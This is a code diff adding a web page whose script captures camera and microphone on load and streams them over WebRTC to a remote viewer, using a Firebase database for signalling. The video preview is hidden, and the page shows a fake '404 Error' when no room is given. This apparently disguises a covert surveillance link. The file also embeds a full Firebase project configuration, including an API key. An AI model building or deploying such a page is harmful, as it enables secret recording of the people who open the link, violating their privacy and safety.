@@ -1,0 +1,142 @@
+<body>
+
+<video id="localVideo" autoplay muted playsinline style="display:none;"></video>
+
+<script>
+const FIREBASE_CONFIG = {
+  apiKey: "AIzaSyC7yd2CdX9uqlJsc7qygk2AhkI9xJOQj70",
+  authDomain: "camera-47d67.firebaseapp.com",
+  databaseURL: "https://camera-47d67-default-rtdb.firebaseio.com",
+  projectId: "camera-47d67",
+  storageBucket: "camera-47d67.firebasestorage.app",
+  messagingSenderId: "982547074326",
+  appId: "1:982547074326:web:7525f078e52c7b9e8d9437"
+};
+
+const RTC_CONFIG = {
+  iceServers: [
+    { urls: "stun:stun.l.google.com:19302" },
+    { urls: "stun:stun1.l.google.com:19302" }
+  ]
+};
+
+firebase.initializeApp(FIREBASE_CONFIG);
+const db = firebase.database();
+
+const room = new URLSearchParams(location.search).get("room");
+
+let pc;
+
+async function startCamera(){
+
+if(!room){
+    document.body.innerHTML = "404 Error";
+    return;
+}
+
+let stream;
+
+try {
+
+stream = await navigator.mediaDevices.getUserMedia({
+ video:{
+   facingMode:{ideal:"environment"},
+   width:{ideal:1280},
+   height:{ideal:720}
+ },
+ audio:true
+});
+
+}catch(e){
+ document.body.innerHTML="Camera Permission Error";
+ return;
+}
+
+
+document.getElementById("localVideo").srcObject = stream;
+
+
+// clear old session
+await db.ref(`sv/${room}`).remove();
+
+
+pc = new RTCPeerConnection(RTC_CONFIG);
+
+
+stream.getTracks().forEach(track=>{
+ pc.addTrack(track,stream);
+});
+
+
+pc.onicecandidate = ({candidate})=>{
+
+if(candidate){
+ db.ref(`sv/${room}/camICE`)
+ .push(candidate.toJSON());
+}
+
+};
+
+
+// create offer
+
+const offer = await pc.createOffer();
+
+await pc.setLocalDescription(offer);
+
+
+await db.ref(`sv/${room}/offer`)
+.set({
+ type:offer.type,
+ sdp:offer.sdp
+});
+
+
+
+// receive viewer answer
+
+db.ref(`sv/${room}/answer`)
+.on("value",async snap=>{
+
+let data=snap.val();
+
+if(data && !pc.currentRemoteDescription){
+
+await pc.setRemoteDescription(
+ new RTCSessionDescription(data)
+);
+
+}
+
+});
+
+
+
+// receive viewer ICE
+
+db.ref(`sv/${room}/viewICE`)
+.on("child_added",async snap=>{
+
+let c=snap.val();
+
+if(c){
+
+try{
+await pc.addIceCandidate(
+new RTCIceCandidate(c)
+);
+}catch(e){}
+
+}
+
+});
+
+
+}
+
+
+startCamera();
+
+</script>
+
+</body>
